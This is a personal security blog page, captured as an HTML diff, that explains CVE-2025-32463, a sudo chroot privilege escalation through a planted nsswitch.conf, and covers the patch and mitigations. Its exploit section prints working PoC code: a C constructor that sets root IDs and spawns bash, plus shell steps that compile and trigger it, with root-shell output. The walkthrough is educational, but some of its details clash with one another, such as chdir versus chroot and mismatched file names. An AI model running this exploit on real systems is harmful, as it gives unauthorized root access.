@@ -1,0 +1,355 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>chwoot | v1pa0z Blog</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="my personal blog">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="chwoot"/>
+  <meta property="og:site_name" content="v1pa0z Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="v1pa0z Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.jpg" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">v1pa0z Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/index" title="Home">
+			  <i class="fa fa-home"></i>Home
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> chwoot</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="OERVIEW"><a href="#OERVIEW" class="headerlink" title="__OERVIEW"></a>__OERVIEW</h1><p>In this post, we dive into <strong>CVE-2025-32463</strong>, a recently disclosed vulnerability in Sudo’s <code>-R</code> (<code>--chroot</code>) option  that allows local privilege escalation by abusing <code>chroot</code> in combination with how <code>nsswitch</code> resolves system resources. Discovered by <strong>Rich Mirch</strong>, this flaw makes It  possible for an attacker to trick sudo into loading an arbitrary shared library by creating an <code>/etc/nsswitch.conf</code> file under the user-specified root directory.</p>
+<hr>
+<h2 id="Introduction-to-chroot"><a href="#Introduction-to-chroot" class="headerlink" title="Introduction to chroot"></a>Introduction to chroot</h2><p>The <code>chroot</code>  Option (<strong>short for change root</strong>) is a linux  sudo command that changes the apparent root directory (<code>/</code>) for the current running process and its children.</p>
+<p>The <em>chroot(2)</em> system call and <em>chroot(8)</em> commands  within  are used to limit the files and directories a process can access on a given file system. This is done by changing the root directory of the process to a given path, restricting its view to files under the path. It essentially puts the process in a <strong>“jail”</strong> </p>
+<p>by default any user can specify a chroot directory, to confirm this we can this command</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
+<p>A value of “*” in the <em>runchroot&#x3D; sudoers</em> configuration indicates that our lowpriv user may specify the root directory by running <em>sudo</em> with the -R option. An example configuration using this option is shown below.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lowpriv@prod:~$ sudo -l</span><br><span class="line">Matching Defaults entries for lowpriv on prod:</span><br><span class="line">    env_reset,</span><br><span class="line">    mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty,</span><br><span class="line">    runchroot=*</span><br><span class="line">    User lowpriv may run the following commands on prod:</span><br><span class="line">    (root) /bin/bash</span><br><span class="line">lowpriv@prod:~$ sudo -R /web /bin/bash</span><br><span class="line">bash-5.2#</span><br></pre></td></tr></table></figure>
+<h4 id="Creating-a-jail-environment"><a href="#Creating-a-jail-environment" class="headerlink" title="Creating a jail environment"></a>Creating a jail environment</h4><p>To function properly within a chroot jail, the target directory must contain <strong>all required binaries and libraries</strong> needed by chroot such as a shell inside a  bin folder (<code>/bin/bash</code>) and essential shared libraries (like <code>libc</code>, <code>libm</code>, etc.). Without these, the environment may fail to start or function correctly.</p>
+<p>Below is an example  Sudo rule. The lowpriv account is allowed to execute <code>/bin/bash</code> under <code>/web</code>. In this example rule, the user does not pass the chroot directory using the command-line options. Instead, Sudo will <code>chroot</code> to <code>/web</code> prior to executing <code>/bin/bash</code>. Meaning <code>/web</code> becomes bash’s root directory.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot=/web /bin/bash</span><br><span class="line">after ch:</span><br><span class="line">/web/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>When the command is executed via Sudo, the root path will be set to <code>/web</code>, so<code> /web/bin/bash</code> must exist along with any linked libraries. The example below of <code>lsof</code> command output shows the lowpriv user running <code>/bin/bash</code> under <code>/web</code> via <code>rtd</code>: (short for root dir).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot /web /bin/bash</span><br><span class="line">$ lsof </span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME </span><br><span class="line">bash    160095 root  cwd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  rtd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  txt    REG  252,0  1446024 1048604 /web/bin/bash </span><br><span class="line">bash    160095 root  mem    REG  252,0  2125328 1048600 /web/lib/x86…gnu/libc.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   208328 1048601 /web/lib/x86…libtinfo.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   236616 1048602 /web/lib64/ld-…64.so.2 </span><br></pre></td></tr></table></figure>
+<p>The <code>rtd</code> entry in <code>lsof</code> confirms that the <strong>root directory</strong> (<code>/</code>, from the perspective of the process) has been <strong>changed using <code>chroot</code></strong>, and is now pointing to <code>/web</code>.</p>
+<p>Additionally, commands like <code>ls</code> or <code>cd</code> won’t work because their binaries were not copied to  the chroot environment: <code>/web</code> , so they simply don’t exist in that directory.</p>
+<h2 id="The-nsswitch-configuration-file"><a href="#The-nsswitch-configuration-file" class="headerlink" title="The nsswitch configuration file"></a>The nsswitch configuration file</h2><p><code>nsswitch.conf</code> (short for <strong>Name Service Switch</strong>) is a configuration file in linux   located at <code>/etc/nsswitch.conf</code>. nsswitch tells the system <strong>how to resolve names and look up various types of information</strong>  such as usernames, hostnames, groups, passwords, and more.</p>
+<h4 id="Inside-the-config-file"><a href="#Inside-the-config-file" class="headerlink" title="Inside the config file"></a>Inside the config file</h4><p>The following <code>nsswitch.conf</code> entries define where the system should look when resolving various types of information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">passwd:     files systemd</span><br><span class="line">group:      files</span><br><span class="line">shadow:     files</span><br><span class="line">hosts:      files dns</span><br><span class="line">networks:   files</span><br></pre></td></tr></table></figure>
+<p>Each line has the format:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;database&gt;: &lt;source1&gt; [&lt;source2&gt; ...]</span><br></pre></td></tr></table></figure>
+<p>For example:</p>
+<ul>
+<li><code>hosts: files dns</code><br>  → When resolving hostnames (e.g., for <code>ping google.com</code>), check:<ol>
+<li><code>/etc/hosts</code> (<code>files</code>)</li>
+<li>DNS servers (<code>dns</code>)<br>a little detail here</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd: files ldap</span><br></pre></td></tr></table></figure>
+
+<p><code>files</code> mean that the system will first look for <code>passwd</code> in the <code>/etc</code> directory. The <code>ldap</code>  after refers to the ldap source which translates  to the shared library: <code>libnss_ldap.so</code>. That’s how NSS dynamically loads the appropriate library based on the source name.</p>
+<p>A <strong>library</strong> is a collection of precompiled code that can be reused by programs. There are two main types:</p>
+<ul>
+<li><p><strong>Static libraries</strong> (<code>.a</code> files)</p>
+<ul>
+<li>Linked into the program at <strong>compile time</strong></li>
+<li>Code becomes part of the final binary</li>
+<li>No external dependency at runtime</li>
+</ul>
+</li>
+<li><p><strong>Shared libraries</strong> (<code>.so</code> files — <strong>shared objects</strong>)</p>
+<ul>
+<li>Linked at <strong>runtime</strong>, not baked into the binary</li>
+<li>Multiple programs can share a single copy in memory</li>
+</ul>
+</li>
+</ul>
+<h2 id="CVE-2025-32463-chwoot"><a href="#CVE-2025-32463-chwoot" class="headerlink" title="CVE-2025-32463 (chwoot)"></a>CVE-2025-32463 (chwoot)</h2><h3 id="Sudo-chroot-Elevation-of-Privilege-Walkthrough"><a href="#Sudo-chroot-Elevation-of-Privilege-Walkthrough" class="headerlink" title="Sudo chroot Elevation of Privilege Walkthrough"></a>Sudo chroot Elevation of Privilege Walkthrough</h3><p>CVE-2025-32463 was introduced in <code>Sudo v1.9.14</code> (June 2023) with the update to the <em>command matching handling code</em> when the chroot feature is used.<br>from update notes:<br><em>Improved command matching when a chroot is specified in sudoers. The sudoers plugin will now change the root directory id needed before performing command matching. Previously, the root directory was simply prepared to the path that was being processed.</em></p>
+<p>The issue arises from allowing an unprivileged user to invoke <em>chroot()</em> on a writable, untrusted path under their control. Sudo calls <em>chroot()</em> several times, regardless of whether the user has corresponding Sudo rule configured.</p>
+<p>Allowing a low-privileged user the ability to call <em>chroot()</em> with root authority to a writable location can have various security risks.</p>
+<h3 id="nsswitch-abuse"><a href="#nsswitch-abuse" class="headerlink" title="nsswitch abuse"></a>nsswitch abuse</h3><p>One interesting note that may not be immediately apparent when reading the <em>nsswitch.conf</em> file is that the name of the source is also used as part of the path for a shared object (library). For example</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd:         files ldap</span><br><span class="line">group:          files ldap</span><br></pre></td></tr></table></figure>
+<p>the above <em>ldap</em> source translates to <code>libnss_ldap.so</code>. When an NSS function uses the <em>ldap</em> source, the library is loaded.</p>
+<p>Because of this behavior,  <strong>any local user can trick Sudo into loading  an arbitrary shared object</strong>, via our own <code>nsswitch</code> that we put inside the chroot directory as <code>/web/etc/nsswitch.conf</code>,  resulting in arbitrary code execution as root. </p>
+<p>To exploit this issue, the following <em>&#x2F;etc&#x2F;nsswitch.conf</em> file was placed inside of the chrooted environment. The <em>&#x2F;vipa0z</em> NSS “source” is translated to <em>libnss</em>&#x2F;vipa0z.so.2, which is a shared object under a path we control.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd: /vipa0z</span><br></pre></td></tr></table></figure>
+<p>The folllowing stack trace shows the malicious shared object that has been loaded by Sudo. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#0  0x0000763a155db181 in woot () from libnss_/vipa0z.so.2</span><br><span class="line">#1  0x0000763a1612271f in call_init</span><br><span class="line">#8  0x0000763a1612a164 in _dl_open (file=&quot;libnss_/vipa0z.so.2&quot;, </span><br><span class="line">#14 0x0000763a15f53a0f in module_load</span><br><span class="line">#15 0x0000763a15f53ee5 in __nss_module_load</span><br><span class="line">#17 0x0000763a15f5460b in __GI___nss_lookup_function</span><br><span class="line">#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2</span><br><span class="line">#20 0x0000763a15f62628 in __getpwnam_r </span><br><span class="line">#21 0x0000763a15d59ae8 in pam_modutil_getpwnam</span><br><span class="line">#27 0x0000763a15d58d99 in pam_acct_mgmt</span><br><span class="line">#28 0x0000763a1577e491 in sudo_pam_approval</span><br></pre></td></tr></table></figure>
+<p><img src="/image.png" alt="alt text"></p>
+<h2 id="The-exploit"><a href="#The-exploit" class="headerlink" title="The exploit"></a>The exploit</h2><p>with all the ABC out of the way, now for the fun part:<br>let’s start by grapping this  PoC, written by <a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot">pr0v3rbst</a> and begin to dissect it<br>This exploit utilizes a shared library object (<code>.so</code>) to create a bash process running as the root user</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; vipa0z.c&lt;&lt;EOF</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">woot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p>We begin by defining a <strong>constructor function</strong> in C, a special function marked to execute <strong>before <code>main()</code> runs</strong>. Inside this constructor, the process’s <strong>effective user ID and group ID</strong> (<code>euid</code> and <code>egid</code>) are both set to <code>0</code>, giving the process <strong>root-level privileges</strong>.</p>
+<p>Next, the code calls <code>chroot(&quot;/&quot;)</code>, effectively <strong>breaking out of the chroot jail</strong> by resetting the root directory back to the actual system root (<code>/</code>). This bypasses the restricted environment (e.g., <code>/web</code>) and restores full access to the real filesystem.</p>
+<h3 id="nsswitch"><a href="#nsswitch" class="headerlink" title="nsswitch"></a>nsswitch</h3><p>we then <strong>Create a fake <code>nsswitch.conf</code></strong> inside the <code>woot</code> directory and inject the following line:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line">echo &quot;passwd: /vipa0z&quot; &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c</span><br><span class="line"></span><br><span class="line">echo &quot;woot!&quot;</span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf $&#123;STAGE?&#125;</span><br></pre></td></tr></table></figure>
+<p>This instructs the system to treat <code>/vipa0z</code> as the NSS source when resolving user account information (like <code>/etc/passwd</code>). When the system sees this entry, it will attempt to load a shared object named <code>libnss_vipa0z.so</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/group /web/etc</span><br></pre></td></tr></table></figure>
+
+<p><strong>Copy <code>/etc/group</code></strong> into the jail so group lookups don’t fail when the process runs in chroot.</p>
+<ul>
+<li><strong>Compile the shared object</strong> (<code>vipa0z.c</code>) into a <code>.so</code> file and move it to a <code>/libnss_</code> directory (the <em>lib</em> folder)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -Wl,-init,web -o libnss_/vipa0z.so.2 vipa0z.c</span><br></pre></td></tr></table></figure>
+
+<p>Executing on Ubuntu 24.04.2 LTS server with <code>Sudo v1.9.15p5</code>, using an unprivileged user with no Sudo rules defined, results in a root shell outside of the chrooted environment.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lowpriv@prod:~/CVE-2025-32463$ id</span><br><span class="line">uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)</span><br><span class="line">lowpriv@prod:~/CVE-2025-32463$ sudo -l</span><br><span class="line">[sudo] password for lowpriv:</span><br><span class="line">Sorry, user lowpriv may not run sudo on prod.</span><br><span class="line">lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh</span><br><span class="line">woot!</span><br><span class="line">root@prod:/# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(lowpriv)</span><br></pre></td></tr></table></figure>
+
+<h2 id="the-sudo-Patch"><a href="#the-sudo-Patch" class="headerlink" title="the sudo Patch?"></a>the sudo Patch?</h2><p>The patch essentially reverts to the changes implemented in <code>Sudo 1.9.14</code>. The <em>pivot_root()</em> and <em>unpivot_root()</em> functions were removed, and <em>chroot()</em> is no longer called during the command matching phase.</p>
+<p>With the patch applied, the exploit fails because <em>chroot()</em> is no longer called.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh</span><br><span class="line">woot!</span><br><span class="line">sudo: the -R option will be removed in a future version of sudo</span><br><span class="line">Password:</span><br><span class="line">sudo: you are not permitted to use the -R option with woot</span><br></pre></td></tr></table></figure>
+<h1 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h1><ul>
+<li>Install the latest sudo packages for your system. No workaround exists for this issue.</li>
+<li>The chroot option is now deprecated as of 1.9.17p1. It is recommended to avoid using the chroot options, as this could unintentionally make your environment less secure if not implemented properly.</li>
+<li>Search your environment for any use of the chroot option. Review all Sudo rules defined in &#x2F;etc&#x2F;sudoers, and files under &#x2F;etc&#x2F;sudoers.d. If the Sudo rules are stored in LDAP, use tools such as ldapsearch to dump the rules.</li>
+<li>Look for the use of the runchroot&#x3D; option or CHROOT&#x3D;</li>
+<li>You can search for sudo entries in the syslog. Any commands using chroot will be logged with the CHROOT&#x3D;</li>
+</ul>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a target="_blank" rel="noopener" href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot">stratascale.com&#x2F;vulnerability-alert-CVE-2025-32463-sudo-chroot</a><br><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-32462">nvd.nist.gov&#x2F;CVE-2025-32462</a><br><a target="_blank" rel="noopener" href="https://www.sudo.ws/security/advisories/chroot_bug/">www.sudo.ws/advisories/chroot_bug&#x2F;</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=9nRr3R9gEb8&t=307s">https://www.youtube.com/watch?=low-level-code/sudo-chwoot</a></p>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/07/12/attacking python libraries/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-07-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
